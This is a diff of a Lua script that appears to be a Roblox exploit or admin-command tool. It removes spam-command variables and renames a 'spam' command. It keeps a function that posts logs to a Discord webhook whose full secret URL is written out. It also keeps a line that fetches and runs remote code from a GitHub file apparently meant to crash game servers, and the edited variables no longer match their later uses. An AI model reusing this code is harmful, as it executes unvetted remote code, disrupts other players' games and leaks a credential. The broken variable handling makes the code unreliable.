@@ -37,8 +37,7 @@ padbanned = {}
 scriptbanned = {}
 banned = {}
 whitelisted = {game.Players.LocalPlayer.name}
-local spamming = false
-local Wspamming = "nothing"
+
 
 local function sendlog(player, msg)
   local Webhook = "https://discord.com/api/webhooks/935964465881575474/9bvow77BH8qNOWEEBHOKJHZVMGt-Rzb7rnHWsFVkGAEX9CZiBFAuzKkPgUw07EsBMOaXe1L9tb6ef"
@@ -1192,10 +1191,6 @@ wait(0.25)
 loadstring(game:HttpGet(("https://raw.githubusercontent.com/Tech-187/Lua-scripts/main/scv3-var's%20usilcrash"),true))()
 end
 
-	if string.sub(msg:lower(), 0, 6) == prefix.."spam " then
-		Wspamming = string.sub(msg:lower(), 7)
-		spamming = true
-	end
 
 
 
@@ -1467,7 +1462,7 @@ if string.sub(msg:lower(), 0, 7) == prefix.."super " then
       Players.LocalPlayer.Character.HumanoidRootPart.CFrame = oldCF
     end
   end
-  if string.sub(msg:lower(), 1, 6):lower() == prefix.."2spam " then
+  if string.sub(msg:lower(), 1, 6):lower() == prefix.."spam " then
     spamming = true
     local strglower = string.gsub(msg:lower(), "me", player.name)
     wspamming = string.sub(strglower, 7, strglower:len())
